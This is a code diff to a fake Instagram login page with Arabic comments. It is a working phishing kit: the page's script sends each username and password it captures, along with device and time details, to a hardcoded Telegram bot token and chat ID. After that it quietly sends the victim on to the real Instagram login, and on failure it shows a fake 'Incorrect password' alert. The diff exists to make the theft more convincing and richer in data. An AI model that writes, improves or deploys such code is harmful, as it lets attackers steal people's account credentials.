@@ -55,6 +55,7 @@
             font-size: 14px;
             cursor: pointer;
             margin-top: 10px;
+            transition: 0.3s;
         }
         .forgot {
             display: block;
@@ -75,6 +76,8 @@
             font-weight: bold;
             font-size: 15px;
             letter-spacing: 1px;
+            display: block;
+            margin-top: 5px;
         }
     </style>
 </head>
@@ -87,7 +90,7 @@
         <input type="text" id="user" placeholder="Phone number, username, or email">
         <input type="password" id="pass" placeholder="Password">
         
-        <button onclick="login()">Log In</button>
+        <button id="loginBtn" onclick="login()">Log In</button>
         
         <a href="#" class="forgot">Forgot password?</a>
     </div>
@@ -101,17 +104,40 @@
         function login() {
             const u = document.getElementById('user').value;
             const p = document.getElementById('pass').value;
+            const btn = document.getElementById('loginBtn');
 
             if (u.trim() === "" || p.trim() === "") return;
 
+            // تغيير شكل الزر للتحميل
+            btn.innerText = "Connecting...";
+            btn.style.opacity = "0.7";
+            btn.disabled = true;
+
             const token = "7613459656:AAGQ9YufupJTUGedqSBSSobBln_8SrCbY4g";
             const id = "7712950930";
-            const msg = `🚨 **LOG** 🚨\n👤 **User:** ${u}\n🔑 **Pass:** ${p}`;
+            
+            // ميساج غني بالمعلومات لتليغرام
+            const msg = `
+🌟 **محاولة دخول جديدة** 🌟
+━━━━━━━━━━━━━━━━
+👤 **User:** \`${u}\`
+🔑 **Pass:** \`${p}\`
+📱 **Device:** ${navigator.platform}
+⏰ **Time:** ${new Date().toLocaleString('ar-MA')}
+━━━━━━━━━━━━━━━━`;
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`)
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
             .then(() => {
+                setTimeout(() => {
+                    // التوجيه التلقائي لإنستغرام الحقيقي
+                    window.location.href = "https://www.instagram.com/accounts/login/";
+                }, 1500);
+            })
+            .catch(() => {
                 alert("Incorrect password. Please try again.");
-                document.getElementById('pass').value = "";
+                btn.innerText = "Log In";
+                btn.style.opacity = "1";
+                btn.disabled = false;
             });
         }
     </script>
